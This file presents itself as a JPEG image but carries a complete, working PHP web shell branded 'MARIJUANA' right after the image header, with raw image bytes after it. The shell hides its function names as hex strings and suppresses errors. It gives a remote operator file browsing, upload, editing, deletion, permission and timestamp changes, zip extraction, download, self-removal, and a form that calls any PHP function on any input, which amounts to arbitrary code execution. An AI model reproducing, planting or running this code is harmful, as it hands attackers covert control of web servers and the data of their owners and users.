���� JFIF      ��8L<?php header("X-XSS-Protection: 0");ob_start();set_time_limit(0);error_reporting(0);ini_set('display_errors', FALSE);
$Array = [
		'7068705f756e616d65',
		'70687076657273696f6e',
		'6368646972',
		'676574637764',
		'707265675f73706c6974',
		'636f7079',
		'66696c655f6765745f636f6e74656e7473',
		'6261736536345f6465636f6465',
		'69735f646972',
		'6f625f656e645f636c65616e28293b',
		'756e6c696e6b',
		'6d6b646972',
		'63686d6f64',
		'7363616e646972',
		'7374725f7265706c616365',
		'68746d6c7370656369616c6368617273',
		'7661725f64756d70',
		'666f70656e',
		'667772697465',
		'66636c6f7365',
		'64617465',
		'66696c656d74696d65',
		'737562737472',
		'737072696e7466',
		'66696c657065726d73',
		'746f756368',
		'66696c655f657869737473',
		'72656e616d65',
		'69735f6172726179',
		'69735f6f626a656374',
		'737472706f73',
		'69735f7772697461626c65',
		'69735f7265616461626c65',
		'737472746f74696d65',
		'66696c6573697a65',
		'726d646972',
		'6f625f6765745f636c65616e',
		'7265616466696c65',
		'617373657274',
];
$___ = count($Array);
for($i=0;$i<$___;$i++) {
	$GNJ[] = uhex($Array[$i]);
}
?>
<!DOCTYPE html>
	<html dir="auto" lang="en-US">

		<head>
			<meta charset="UTF-8">
			<meta name="robots" content="NOINDEX, NOFOLLOW">

				<title>MARIJUANA</title>

			<link rel="icon" href="//0x5a455553.github.io/MARIJUANA/icon.png" />
			<link rel="stylesheet" href="//0x5a455553.github.io/MARIJUANA/main.css" type="text/css">

			<script src="//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
			<script src="//cdnjs.cloudflare.com/ajax/libs/notify/0.4.2/notify.min.js"></script>
		</head>

		<body>
			<header>
				<div class="y x">
					<a class="ajx" href="<?php echo basename($_SERVER['PHP_SELF']);?>">
						MARIJuANA
					</a>
				</div>

				<div class="q x w">
					&#8212; DIOS &#8212; NO &#8212; CREA &#8212; NADA &#8212; EN &#8212; VANO &#8212;
				</div>
				
			</header>

			<article>
				<div class="i">
					<i class="far fa-hdd"></i>
					<?php echo $GNJ[0]();?>

					<br />

					<i class="far fa-lightbulb"></i> &thinsp;&thinsp;<b>SOFT  :</b> <?php echo $_SERVER['SERVER_SOFTWARE'];?> <b>PHP :</b> <?php echo $GNJ[1]();?>

					<br />

					<i class="far fa-folder"></i>
					
					<?php
					if(isset($_GET["d"])) {
						$d = uhex($_GET["d"]);
						$GNJ[2](uhex($_GET["d"]));
					}
					else {
						$d = $GNJ[3]();
					}
					$k = $GNJ[4]("/(\\\|\/)/", $d );
					foreach ($k as $m => $l) { 
						if($l=='' && $m==0) {
							echo '<a class="ajx" href="?d=2f">/</a>';
						}
						if($l == '') { 
							continue;
						}
						echo '<a class="ajx" href="?d=';
						for ($i = 0; $i <= $m; $i++) {
							echo hex($k[$i]); 
							if($i != $m) {
								echo '2f';
							}
						}
						echo '">'.$l.'</a>/'; 
					}
					?>

					<br />

				</div>

				<div class="u">
					<?php echo $_SERVER['SERVER_ADDR'];?> <i class="fas fa-link"></i>
					<br />

					<br />

					<form method="post" enctype="multipart/form-data">
						<label class="l w">
							<input type="file" name="n[]" onchange="this.form.submit()" multiple> &nbsp;UPLOAD
						</label>&nbsp;
					</form>

					<?php
					$o_ = [ 
							'<script>$.notify("',
							'", { className:"1",autoHideDelay: 2000,position:"left bottom" });</script>'
						];
					$f = $o_[0].'OK!'.$o_[1];
					$g = $o_[0].'ER!'.$o_[1];
					if(isset($_FILES["n"])) {
						$z = $_FILES["n"]["name"];
						$r = count($z);
						for( $i=0 ; $i < $r ; $i++ ) {
							if($GNJ[5]($_FILES["n"]["tmp_name"][$i], $z[$i])) {
								echo $f;
							}
							else {
								echo $g;
							}
						}
					}
					?>

				</div>
					<?php
					$a_ = '<table cellspacing="0" cellpadding="7" width="100%">
						<thead>
							<tr>
								<th>';
					$b_ = '</th>
							</tr>
						</thead>
						<tbody>
							<tr>
								<td></td>
							</tr>
							<tr>
								<td class="x">';
					$c_ = '</td>
							</tr>
						</tbody>
					</table>';
					$d_ = '<br />
										<br />
										<input type="submit" class="w" value="&nbsp;OK&nbsp;" />
									</form>';
					if(isset($_GET["s"])) {
						echo $a_.uhex($_GET["s"]).$b_.'
									<textarea readonly="yes">'.$GNJ[15]($GNJ[6](uhex($_GET["s"]))).'</textarea>
									<br />
									<br />
									<input onclick="location.href=\'?d='.$_GET["d"].'&e='.$_GET["s"].'\'" type="submit" class="w" value="&nbsp;EDIT&nbsp;" />
								'.$c_;
					}
					elseif(isset($_GET["y"])) {
						echo $a_.'REQUEST'.$b_.'
									<form method="post">
										<input class="x" type="text" name="1" />&nbsp;&nbsp;
										<input class="x" type="text" name="2" />
										'.$d_.'
									<br />
									<textarea readonly="yes">';

									if(isset($_POST["2"])) {
										echo $GNJ[15](dre($_POST["1"], $_POST["2"]));
									}

								echo '</textarea>
								'.$c_;
					}
					elseif(isset($_GET["e"])) {
						echo $a_.uhex($_GET["e"]).$b_.'
									<form method="post">
										<textarea name="e" class="o">'.$GNJ[15]($GNJ[6](uhex($_GET["e"]))).'</textarea>
										<br />
										<br />
										<span class="w">BASE64</span> :
										<select id="b64" name="b64">
											<option value="0">NO</option>
											<option value="1">YES</option>
										</select>
										'.$d_.'
								'.$c_.'
								
					<script>
						$("#b64").change(function() {
							if($("#b64 option:selected").val() == 0) {
								var X = $("textarea").val();
								var Z = atob(X);
								$("textarea").val(Z);
							}
							else {
								var N = $("textarea").val();
								var I = btoa(N);
								$("textarea").val(I);
							}
						});
					</script>';
					if(isset($_POST["e"])) {
						if($_POST["b64"] == "1") {
							$ex = $GNJ[7]($_POST["e"]);
						}
						else {
							$ex = $_POST["e"];
						}
						$fp = $GNJ[17](uhex($_GET["e"]), 'w');
						if($GNJ[18]($fp, $ex)) {
							OK();
						}
						else {
							ER();
						}
						$GNJ[19]($fp);
					  }
					}
					elseif(isset($_GET["x"])) {
						rec(uhex($_GET["x"]));
						if($GNJ[26](uhex($_GET["x"]))) {
							ER();
						}
						else {
							OK();
						}

					}
					elseif(isset($_GET["t"])) {
						echo $a_.uhex($_GET["t"]).$b_.'
									<form action="" method="post">
										<input name="t" class="x" type="text" value="'.$GNJ[20]("Y-m-d H:i", $GNJ[21](uhex($_GET["t"]))).'">
										'.$d_.'
								'.$c_;
					if( !empty($_POST["t"]) ) {
						$p = $GNJ[33]($_POST["t"]);
						if($p) {
							if(!$GNJ[25](uhex($_GET["t"]),$p,$p)) {
								ER();
							}
							else {
								OK();
							}
						}
						else {
							ER();
						}
					  }
					}
					elseif(isset($_GET["k"])) {
						echo $a_.uhex($_GET["k"]).$b_.'
									<form action="" method="post">
										<input name="b" class="x" type="text" value="'.$GNJ[22]($GNJ[23]('%o', $GNJ[24](uhex($_GET["k"]))), -4).'">
										'.$d_.'
								'.$c_;
					if(!empty($_POST["b"])) {
						$x = $_POST["b"];
						$t = 0;
					for($i=strlen($x)-1;$i>=0;--$i)
						$t += (int)$x[$i]*pow(8, (strlen($x)-$i-1));
					if(!$GNJ[12](uhex($_GET["k"]), $t)) {
						ER();
					}
					else {
						OK();
						  }
						}
					}
					elseif(isset($_GET["l"])) {
						echo $a_.'+DIR'.$b_.'
									<form action="" method="post">
										<input name="l" class="x" type="text" value="">
										'.$d_.'
								'.$c_;
					if(isset($_POST["l"])) {
						if(!$GNJ[11]($_POST["l"])) {
							ER();
						}
						else {
							OK();
						}
					  }
					}
					elseif(isset($_GET["q"])) {
						if($GNJ[10](__FILE__)) {
							$GNJ[38]($GNJ[9]);
							header("Location: ".basename($_SERVER['PHP_SELF'])."");
							exit();
						}
						else {
							echo $g;
						}
					}
					elseif(isset($_GET["n"])) {
						echo $a_.'+FILE'.$b_.'
									<form action="" method="post">
										<input name="n" class="x" type="text" value="">
										'.$d_.'
								'.$c_;
					if(isset($_POST["n"])) {
						if(!$GNJ[25]($_POST["n"])) {
							ER();
						}
						else {
							OK();
						}
					  }
					}
					elseif(isset($_GET["r"])) {
						echo $a_.uhex($_GET["r"]).$b_.'
									<form action="" method="post">
										<input name="r" class="x" type="text" value="'.uhex($_GET["r"]).'">
										'.$d_.'
								'.$c_;
					if(isset($_POST["r"])) {
						if($GNJ[26]($_POST["r"])) {
							ER();
						}
						else {
							if($GNJ[27](uhex($_GET["r"]), $_POST["r"])) {
								OK();
							}
							else {
								ER();
							}
						  }
					   }
					}
					elseif(isset($_GET["z"])) {
						$zip = new ZipArchive;
						$res = $zip->open(uhex($_GET["z"]));
							if($res === TRUE) {
								$zip->extractTo(uhex($_GET["d"]));
								$zip->close();
								OK();
							} else {
								ER();
						  }
					}
					else {
					echo '<table cellspacing="0" cellpadding="7" width="100%">
						<thead>
							<tr>
								<th width="44%">[ NAME ]</th>
								<th width="11%">[ SIZE ]</th>
								<th width="17%">[ PERM ]</th>
								<th width="17%">[ DATE ]</th>
								<th width="11%">[ ACT ]</th>
							</tr>
						</thead>
						<tbody>
							<tr>
								<td>
									<a class="ajx" href="?d='.hex($d).'&n">+FILE</a>
									<a class="ajx" href="?d='.hex($d).'&l">+DIR</a>
								</td>
							</tr>
						';

							$h = "";
							$j = "";
							$w = $GNJ[13]($d);
							if($GNJ[28]($w) || $GNJ[29]($w)) {
							foreach($w as $c){
								$e = $GNJ[14]("\\", "/", $d);
								if(!$GNJ[30]($c, ".zip")) {
									$zi = '';
								}
								else {
									$zi = '<a href="?d='.hex($e).'&z='.hex($c).'">U</a>';
								}
								if($GNJ[31]("$d/$c")) {
										$o = "";
								}
								elseif(!$GNJ[32]("$d/$c")) {
										$o = " h";
								}
								else {
										$o = " w";
								}
								$s = $GNJ[34]("$d/$c") / 1024;
								$s = round($s, 3);
								if($s>=1024) { 
									$s = round($s/1024, 2) . " MB";
								} else {
									$s = $s . " KB";
								}
							if(($c != ".") && ($c != "..")){
								($GNJ[8]("$d/$c")) ?
								$h .= '<tr class="r">
							<td>
								<i class="far fa-folder m"></i>
								<a class="ajx" href="?d='.hex($e).hex("/".$c).'">'.$c.'</a>
							</td>
							<td class="x">
								dir
							</td>
							<td class="x">
								<a class="ajx'.$o.'" href="?d='.hex($e).'&k='.hex($c).'">'.x("$d/$c").'</a>
							</td>
							<td class="x">
								<a class="ajx" href="?d='.hex($e).'&t='.hex($c).'">'.$GNJ[20]("Y-m-d H:i", $GNJ[21]("$d/$c")).'</a>
							</td>
							<td class="x">
								<a class="ajx" href="?d='.hex($e).'&r='.hex($c).'">R</a>
								<a href="?d='.hex($e).'&x='.hex($c).'">D</a>
							</td>
						</tr>
						
						'
							:
								$j .= '<tr class="r">
							<td>
								<i class="far fa-file m"></i>&thinsp;
								<a class="ajx" href="?d='.hex($e).'&s='.hex($c).'">'.$c.'</a>
							</td>
							<td class="x">
								'.$s.'
							</td>
							<td class="x">
								<a class="ajx'.$o.'" href="?d='.hex($e).'&k='.hex($c).'">'.x("$d/$c").'</a>
							</td>
							<td class="x">
								<a class="ajx" href="?d='.hex($e).'&t='.hex($c).'">'.$GNJ[20]("Y-m-d H:i", $GNJ[21]("$d/$c")).'</a>
							</td>
							<td class="x">
								<a class="ajx" href="?d='.hex($e).'&r='.hex($c).'">R</a>
								<a class="ajx" href="?d='.hex($e).'&e='.hex($c).'">E</a>
								<a href="?d='.hex($e).'&g='.hex($c).'">G</a>
								'.$zi.'
								<a href="?d='.hex($e).'&x='.hex($c).'">D</a>
							</td>
						</tr>
						
						';

							}
						}
					}

						echo $h;
						echo $j;
						echo '</tbody>
						<tfoot>
							<tr>
								<th class="et">
									<a class="ajx" href="?d='.hex($e).'&y">REQUEST</a>
									<a href="?d='.hex($e).'&q">EXIT</a>
								</th>
								<th class="et" width="11%"></th>
								<th class="et" width="17%"></th>
								<th class="et" width="17%"></th>
								<th class="et" width="11%"></th>
							</tr>
					</tfoot>
				</table>';
					}
					?>

			</article>
			<footer class="x">
				&copy;TheAlmightyZeus
			</footer>
			<?php
			if(isset($_GET["1"])) {
				echo $f;
			}
			elseif(isset($_GET["0"])) {
				echo $g;
			}
			else {
				NULL;
			}
			?>

			<script>
				$(".ajx").click(function(t){t.preventDefault();var e=$(this).attr("href");history.pushState("","",e),$.get(e,function(t){$("body").html(t)})});
			</script>
		</body>
	</html>
<?php
	function rec($j) {
		global $GNJ;
		if(trim(pathinfo($j, PATHINFO_BASENAME ), '.') === '') {
			return;
		}
		if($GNJ[8]($j)) {
			array_map('rec', glob($j . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT));
			$GNJ[35]($j);
		}
		else {
			$GNJ[10]($j);
		}
	}
	function dre($y1, $y2) {
		global $GNJ;
		ob_start();
		$GNJ[16]($y1($y2));
		return $GNJ[36]();
	}
	function hex($n) {
		$y='';
		for ($i=0; $i < strlen($n); $i++){
			$y .= dechex(ord($n[$i]));
		}
		return $y;
	}
	function uhex($y) {
		$n='';
		for ($i=0; $i < strlen($y)-1; $i+=2){
			$n .= chr(hexdec($y[$i].$y[$i+1]));
		}
		return $n;
	}
	function OK() {
		global $GNJ, $d;
		$GNJ[38]($GNJ[9]);
		header("Location: ?d=".hex($d)."&1");
		exit();
	}
	function ER() {
		global $GNJ, $d;
		$GNJ[38]($GNJ[9]);
		header("Location: ?d=".hex($d)."&0");
		exit();
	}
	function x($c) {
		global $GNJ;
		$x = $GNJ[24]($c);
		if(($x & 0xC000) == 0xC000) {
			$u = "s";
		}
		elseif(($x & 0xA000) == 0xA000) {
			$u = "l";
		}
		elseif(($x & 0x8000) == 0x8000) {
			$u = "-";
		}
		elseif(($x & 0x6000) == 0x6000) {
			$u = "b";
		}
		elseif(($x & 0x4000) == 0x4000) {
			$u = "d";
		}
		elseif(($x & 0x2000) == 0x2000) {
			$u = "c";
		}
		elseif(($x & 0x1000) == 0x1000) {
			$u = "p";
		}
		else {
			$u = "u";
		}
		$u .= (($x & 0x0100) ? "r" : "-");
		$u .= (($x & 0x0080) ? "w" : "-");
		$u .= (($x & 0x0040) ? (($x & 0x0800) ? "s" : "x") : (($x & 0x0800) ? "S" : "-"));
		$u .= (($x & 0x0020) ? "r" : "-");
		$u .= (($x & 0x0010) ? "w" : "-");
		$u .= (($x & 0x0008) ? (($x & 0x0400) ? "s" : "x") : (($x & 0x0400) ? "S" : "-"));
		$u .= (($x & 0x0004) ? "r" : "-");
		$u .= (($x & 0x0002) ? "w" : "-");
		$u .= (($x & 0x0001) ? (($x & 0x0200) ? "t" : "x") : (($x & 0x0200) ? "T" : "-"));
		return $u;
	}
	if(isset($_GET["g"])) {
		$GNJ[38]($GNJ[9]);
		header("Content-Type: application/octet-stream");
		header("Content-Transfer-Encoding: Binary");
		header("Content-Length: ".$GNJ[34](uhex($_GET["g"])));
		header("Content-disposition: attachment; filename=\"".uhex($_GET["g"])."\"");
		$GNJ[37](uhex($_GET["g"]));
	}
?>

�� C 	!"$"$�� C�� ��" ��              ��             ��    �)^ɩH�H�H�H�H�H�H�H�H�H�H�H�H�H�H�H�H�H�H�H�H�H�H�H                                                             ���.�MS��  n�����J�           �;�h��uʹ�:n��/��e�r��L7-0���4�͜����̍�L]}�}Ҋ��          ���ם���C�n����KJ�O`t� t� t�6���� I����/ؿ���         G�D/4s^wx�֙���#�c��C�  1�}'��C�,�^ߞ۵�;�C         {3��+���9^�5m   MQԘ�[V�q�o�C��v�_i�ф��       �������v�l���� �6I���u�YyS;����p�޲!�c�ϕ�RN���﹎[���M?��.�Ev>�       �O���4�5SW������$h6r���>>��^FW�����)
�p������.�(�4���tt}�N6Og=       0|c�}]�J5y����W��ua&E��bәb$�^���Kt=_=�r����'��K�ó\)��N6Oc=       ���N6)N#�x�}�I����3{��n�=ߞ�W��`5;o5g�:?"I�#�&6ه:�q,���m�4���r��O?���3      ����[��N����߰���f�s�����7;t�Wg <�����lǢ��b2��Cw;���ي�� 9��g��[�m�       5<�Y��i�}��?�=t<�C2�+c[�+'��e�[u���]./����}0{����|h y�3��,J���      ]�k�E�ƽ�-+���&xo���KqO��T)5y�  -{����*���:\�7���       >�=橒"&S˖��[g��q�L���bWkU��E�������O"�OaeQ�Q]��ې        /��3��9�x{����Z����n�3�;i�X�]�j�2X���zh�C��:n���˫̻��}         >��N~���5*�c�q���]i�+������CK�^��/'5�����Qc
�J#��QN�ߧ��7���           kvLZF�1���9H^��0�Ÿ�j5�.ۜ���+���Z؄����ʽ���5[SnA�           ��Tk�?w������~���쨮Na�                                                               �,�+���,�+���,�+���,�+���,�+���,�+����� /         4 235@01P�!#%��  �£
�*0�£
�*0�£
�*0�£
�*0�£
�*0�£
�*0�£
�*0�£
�*0�£
�*0�£
�*0�£
�*0�£
�*0�£��1`+ ��mE�#�)��"��kw����E�	sY��J��%@�W���d~��2m����X�|F�r��;YG�pW���]�N�q����8�#��8�#��8�#��8�!���@0��IC���H�K��Q�E�c���>xԆ4�ڂ��(8�⃊(8�����O��~ǻ���v~�����pW��§!Ω�_��$]	/*��厱}�����B�$����9�;QͣJ�OQOn?�+û�}ь *(��b��g��-�~�Y���!��w�k=���o�=��f玾u�D�29�/@����ܘ�wy���YR�N ��Ob$�TfϚ��4D�L2m���/�<�:���|BlHȣ>���N��'�5����� "�<Z�
Li�B0��l���y�Cm?�5���ۉKm1l�^�{b6�m���$6���] /O<&�E��.p�������Gz8��Ǟ�՞�<�!���]�H�?�#�>��!bh���A��7u���
$�N$�N��k3>x53���Ni�i��y>v��g���n�<	�ľ��Zk��k�m�͞�F���ź��&�0�ai!6�a3��1'�5�Hu�C	*c&}��-��$�^�����yxx�w�4�M�����~�UW`C2_�3�@��Ax����P4#�1�3`���c�r��9X��|�V>G+������G)����z�] /O$���W69�"6Dl���#dD��e�o�d���H��.�s�4��������#�K$��oEB��%���0����7�H���E~�`�g�d���ُ�C��R+��v�u@M&mYg6f����"X�f?�#NI�}F�6�]Cg�ID�1+�����Q�z~������BR_r3v�ا3C�5���r�L�^��Q`�
�c�DV;n�]0��#vE�5��2z�f_&xЋŲB�p�G<�N�����1�R�L�7�����"r��~ǻ���W��|~l�vy^j�.�� �cݶA1UD�ޜ���XW���^��ˁ}p�N'ƉeW�	��pf��9�O�9hE��Ɏ���F
K7b�ء�}�R.��dE ѱb�v(��@�@Izf'L"ȉ+�8�q�LJ�|�V>E+
�\���:)=!�o��O婡�)X�͙?��.p؟����њ��.�"%�E��� R��t������������������������������������������������������������������������������������������������������ .        !01Qa 23b"@BR`q�� ?� V�e������`��b�L貹��f0Y����>?���[��
o�	�YE��켧켧켫�'u_G�Ц�c�%G7���O�7����$���B���D̂޺��,̼�꫍鮣�ź��FKwEeSv��[Կ�7�O#�	¥���oe�ǣ��܇,Jw<�
��^U�M^)���. ��jЇ,K�9��7@�4�k�tJ��joe�M��K̠<�M��tC��KÝh�u��ԏ�o�o�n����>)��Xs��kn�*)��⮚�1,IR���3\,J�*%����XV�J)�!����-Ӻ�;�Ӻ
Y�f�7[�
�g�K��,U[$�Mx:_�,�.�8�ڞ4Oػ2��*�]��]1�7-�޻-�޻-���ۍF�l�KaM�*)������=4A�
py(��Hz*V��grU�cd��a��{�|�M�!�-�^"-d5
��@�L�+�'���rP��c}���@]ڧ7]j�9���u� -�N[<vi���� �� 1         !1"02Qa R3@b#4A`q��� ?���i��<{ۑ}wi�2�]�F2��҈�CP�Gq����:;�qp�fB�ʙ��R��a/�cNa���W�tz��=o����[�A��Af;��|��ϗ��S��}��aJ5k�nC���Sеo����:�s���q�����.Tz!|�೓v]?������ŧ!��d��Y�Ջ���nl|H,��b;h��Y��[�UqCJA����µ=���:�bm�.�Z�B�yU7�?�'B�DY��)��CPV�R�ՙƖ_Ɍy}�)��j-�7t"�F���O��2w��ih��#B����7ݨq��]�7��Z�*mu�D�n^E�������$a�(�~�N\����'0Ṡ2#�:�y�ұ4�-v�MY�_`��l�$��}ět��}E̗�]�~�z>!ֻZsU灾x�y�c�j�r�^b�J�2m(��,�u!f��am��2�0��� �9p�N�ٰ�7��� ʂ<�$ݠq���������������[�wC-a�9֜���&_s�Im��,�*���R�j
�e��ϑ^�S�|�ŭ1�E���\�i%�>\3���ϸ�?m��(�w���p�x(�t������]��Ae�RIY�Ga5�St2�|DvN�D$3��AP��"sJ(D	�v	A#"�'[�M���ο�e�2��� �� ;       2!13�� @qr"0As��CPQ�#Ba�4R�b����  ?��8��*c���8��*c���8��*c���8��*c���8��*c���8��*c���8��*c���8��*c���8��*c���8��*c���8��*c���8��*c���8� �Ր?�3qS7�a����/�X��S���a�:N����:����r��(�s�t�.{m
a�����څB{i4֚�����md�.�o�� �~[I��wo��z��W�^�z��W�^�ƇRu@��D��mmh���|"�v����W���_|������C��*��)���)���)���)���)����Z�����t�<��ہ��z�gH�Ϛ}�(o�P{�A�+�R?2|&���������>ʒ�W��};���C�H�li����I�O�}�
�ST�P:J�ύ>a� �{�U��=��T>|i�p�pvh-���U��8�Z�\v�U�5������@�*>+m�пv
�ӯ� $aE�kj���=����
����7��7���Pv�B���Ι�m1�'�P�g�(4�������݂���P��7��Q��*Â��t�t�n��GV���T>��}ڇ.ἕmH���;��ZU�Zu���C�Gݨr�(�ڿj���Ȍq+!���
+�l�M���^���a���~_G����̆�x/���Tq(s��5���A��6�- �%���p� j�p7�-�=��WXZWO�����_i���}́X��{�i]aPE*�-(@�Wz���xo�}�]�A�Y���Zk�� -TT�S��F���Һƽ+�w��φ�`Q�_��QG�N�5�U��y���=���*��
�~B�_����*��
�~B���+����5���Z{�u�^s�TN|?ݨn�����*¬*¬*´o)���J��s���Ct�w�mw0�a�W0�yU�<��Us*�j�KIdY�_D̘H���>É�L�G�~#�j��6@0��i=>���,���߱�ˆФP]q�P)
��cM�qg��U��|kF�*>2Q������v*wb�-v�9w�G�>��?�~�گ�X0�%j��g9��f�y^D[;���*!�T�*Ҭ��ؼ��O`�
����Ѳ�*Q#�4��U�$c��蝣��M|q-��������RU��F�>�>���- ��=u3�q��>���?��<�ލ�}V��{-'����q�7�
#�(���2� ".mO�5��_1�UG��_�̯����5F-$�U���D8�o"���{�|����nqP�r�ڞI7��+J���E8�]�8ժ	�ݷ�ZTwR|=u���Du_$=��t1ů/ڨSR�vUz��kE4��k��6ҥ�p��Mh��]�E�tg�E}��J1M��qӭ���S>SX
Q��a�(�J0U4ΗOʮ��]?*�~Ut����U���WOʮ��]?*�~Ut����U���WOʮ��]?*�~Ut����U���WOʮ��]?*�~Ut����U���WOʮ��]?*�~Ut����U���WOʮ��]?*�~Ut����U���WOʮ���� +        �!1Qa� @Aq����0�P�р��  ?!� ��!B�!B�!B�!B�!B�!B�&�9	� �,�����_�b��3g��2K�'���IE˽�!i>v	�8~��]5)Ѫ��ũcR3[��*���s�^��w|̓�4�j)�����j)�����u���x.A��4��D_�X�%jQP�����1{��\Zΐ*"�+��+��+��+���2Kmw������l�s�^�����FC��e��1{��\(�J5�"�o�q�|D_N=	��4%��b�7|����?AJn�̅��]-�C�!g���\�C��~��w�W���ͺ�=n6��Ɯ�C��d�x�_��Q�m9�3q�7���m/����/��� �����|�z���&��[�Cl��i�u�E���.��ό��5�ũ���v�f�}��ɽ���t�F\�}��O�+��Ǒha�z�w<w< �l���%���f3]�٨�(�3���Y�e�z�w<w< �]j�p� X�~�*p��|���\Ǡ,Ws�~��v�7Q��=Ź������ ���������F��x�K7�yu7I�J�W²\W����f�4�Ɛ����$46-.�TWu��u�f��/��n�'������D<��O����m�zXk�5���[��)y��^o�Ԟ4�|��/�8O��
�'��rd	#��C� ��z� �μ�gBA�3%{R�DP� �y��vM��'ӓ��c�r����M<L�Ez�$%ƻ��}���a	�ކLܘ�ņa��v�K!���K�ib7\Ǌ����?���P
@( ��Y�T�Q����K���� e��yG�yG�yG�����%���`m	S�ކ�W���\�%7X�%��Fّ�7�M��YS���$(�`��~˙�b�7���X�Ŋ��[�cd��p֗*�;��O�G;�9dq���앓���%f������z?�+�ts�_��4Zc��j��S<q/2^l��%��y�^l��%��y�^l�8�u���a��Nc�Hr�����8aT������Ȋ+�V�"� ̄���
�.3Hi1�.���z�)٨Z�E o8�a7��&��Ά/qA#;Di��7�佞w��I��},Yڱ6<ñ&o
����l�s�N�ϐ�>O'�󾕿6'�|�,q6<ǃ�[7,��#��qS�TAg���X��e����m���?��m�ѱ$��͹m�Ƅ��hlr�N��(K럐�n�C!W"��搽�5찆θbt1!zz�"��;�ٯ��wP2o�b�/�ʼ����f���A.�]l�om�Pʼ�K
#w�V1��*���v�KV(�~��}y5��Lg���]� :WEtWEtWEtWEtWEtWEtWEtWEtWEtWEtWEtWEtWEtWEtWEtWEtWEtWEtWEtWEtWEtWEtWEtWEtWEt��      �<��<��<��<��<��<��0�0�0�0�0�0�0�0�0�0�0�0�0�0�0�0�0�0�0�0�0�80�0�0�0�0�0��[db�0�0�0��A����0�0�0�G=�<��
P��0�0�0~� �<��;-��0�0�0���=����D0�0�0ç�<�������0�0� ���_f��yz0�0�T��q����0�0�0��=��� 0�0�0ío�0A� �0�0�7����C{*0�0�0��v�0�(�C0�0�0�(.Nx;�D0�0�0��@�u��I0�0�0�4���@��0�0�0�0�J��C0�0�0�0�0�0�0�0�0�0�0�0�0�0�0�0�0�0�0�0�0�AAAAAA�� )         !10a�AQq�� @��`���� ?���>�CاC�IPB5�s\�+�.� V)~ñ��-���܇��<7#Ḥ���L��+g���r�Y	�0[�N��l�(˺}s���3ݱ=��{5��d��Лq�΢���[��jl%Q]R��,�k�d����%S��R�3}���w#�O���M�V2�օ�\�@ف�%īF��U�7�̷2���'DaaIoF64�č.�w���C0U�"�q2����e��B4d/��艍EF]�̲Z��T&�q]�LLH,$��Nh�V�� (xEB�aANU�Q�n
ٵ��W�a�RB�b�Cȇ�"D<�h�ׇq�P*���2/�H�Q�i��%�p�Ī�}a\%��tCGt���<Yiʛ���S��{�Hn�@pA�E	�\�/e
�^�~_�� *          !10AQa�� q������@`��� ?�׀�'�|Ϣ?��7�^"����F8��ɜ�Ɍi�7m,�]r'r��C_��H���Ю��w�+��]��~��)���=Q���k�5�NLe��/!5{�z��y��:�~��W����k�	�j�XO����؅$.,ԅhTk��2�?F4�ǒ�[Ogȵ#Do�18�ny�>���6~�$~6�"!qo5|VTб���Z�[ƛ�_�3а�gT/�t#�~�$���5U��0��>4.��,U��x{r�L��c�g�K��-ޢȃ�a�[F9�<\F���%qA	��G��m=�Kьц������Op�����X��kA�q;�H�76��[	y�]��=��V�z�	��u5�/����K���W;W��kV�m_��b��|"��A��b8�Y�.z4�Mm�p����g�\����	��:��:���4�� G��.s�䅄��!P���Un:ƕa�h�Î�C;i^�:�Tg���E6k�-����QQQQQQQQQQQQQQQQQQQQQQQQQ�� +       �!1��AQa @q���0��P����  ?ߓ~M�7�ߓ~M�7�ߓ~M�7�ߓ~M�7�ߓ~M�7�ߓ~M�7�ߓ~M�7�ߓ~M�7�ߓ~M�7�ߓ~M�7�ߓ~M�7�ߓ~M�7�ߓ~�՛3��؟sb}�T�A;!�a�'��,�k"�Ib��A���� �T� t�5����iu��F��ԒP ���89�����0d�W���m���H�L"��!��{��ȊDW!V�~H�5��,�e���5�F���Y�#Ydk0"�*`Oi����rA\��R�X���9tk����W<�����ʬ��"�]�XZKI`i,%���4����P=��`��Im��b����������ų��=�����q���ʎe�	���>�Q��z�uG�B`SQ�J�׽�������x˗ܹ}�� �֯��*��ƤW���>@�ĭi͂��)�z��{��% �u?; ��nM�T���{���=��&;�����姦{���=���Yi8��T�x����R&�-?o14Z�j���(X�px���~�y�Z�i����5��Kk�I�@�J�c���1v���P�B����.�<rK'D���U�Q$ы�[ʉA�T�w����
����0��4J�c:��e㧏$�t"����Ǵ���.P%�J�K�uK��h�ty��sᗎ�<��Є��������n��@`;�O�&䛒nH���(�ty���ᗎ����Fgg��������������N�^!T&'Ij�P����7�oxޱY�`(�Z�N2-�_&��(��<�����#�����P\{A�\هg����
��Df1�`jSفȊ@�ӗ5�7+�+N����=^�<*.P������}���"�	�H��*��W���b@��ǜj�1�x��>�-Q=�g�XۈW�KgY}���a�##�0�w���g�
  W5<�-q�̫��\�Z�	�"�ۏ����]+��Q��
-q���<}gV+އٸ��|�{� ĭs�x���<�Ť`����鈟ٺ&蔑*?�g�㣉0�Lè�+Iei,�%�����Uu���TZ��(Q*f��3p%q��|�s����x}���>�Ǎm]��ɿ&���o��~d�'�(h!_I�Q%J>���[��=����_��hxD� ���������ZzKOIi�R� 8!T�c.�`:ʢ���)��t��/�R՞�����9 ��a� �CU(����ۛ����Z�W��?)**D��:<����G"�0�kC	Y	��Q�`*�ʼ��P�����Q���c+�l2s��c��ǖ�c��6���U��q�7����}�n�pf��0�-d�̈́/�����ݐ �Zɛ0�X��2@>q �S�')�q�mI[�E�ME�mh'?^$C� ?�d�w`�IO�ƨt$�Hj� ��G:��X�%2��柦Q��D�<���j��-zJy׽��P���4�;߱S4�������W���Q*?�BH�1�l����� ̤�*�	X��xԅ���Dg��J�)���9b2Q��ty�B �Z��W	a�,=b��+��>T �w�PŬ6�t�se���++���S�J���1���8�Z�E�ч�J@�h�6D!��ό)SJ����!�O�0����)�nҒr?|�D�:�.�)�(G7�`VG.p�"�d^�
�8Y
s+-�]A�����JKrsc�q���YI����̥m`�
#�f�1;`F�8��\��,hf�@�H9K�C�,�\.{� �n�ʨf���B <
�Q{&���J� �K�Iu�.�%פ���^���]zK�Iu�.�%פ���^���]zK�Iu�.�%פ���^���]zK�Iu�.�%פ���^���]zK�Iu�.�%פ���^���]zK�Iu�.�%פ���^���]zK�Iu�?��